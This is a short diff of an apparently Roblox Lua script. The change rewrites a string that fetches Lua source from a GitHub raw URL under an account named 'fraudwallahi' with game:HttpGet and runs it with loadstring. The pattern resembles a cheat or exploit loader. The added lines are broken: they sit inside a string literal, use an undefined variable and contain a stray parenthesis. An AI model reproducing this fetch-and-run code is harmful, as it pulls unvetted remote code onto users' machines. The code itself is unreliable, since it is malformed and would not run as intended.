@@ -122,7 +122,10 @@ task.spawn(function()
     end
 end)
 
-local src = [[loadstring("https://raw.githubusercontent.com/fraudwallahi/agsrffzsg/refs/heads/main/src.lua")]]
+local src = [["https://raw.githubusercontent.com/fraudwallahi/agsrffzsg/refs/heads/main/src.lua?cb=" .. os.time()
+local script = game:HttpGet(url)
+loadstring(script)()
+)]]
 
 while wait(.25) do
     local error, success = pcall(function()autoLoop()end)
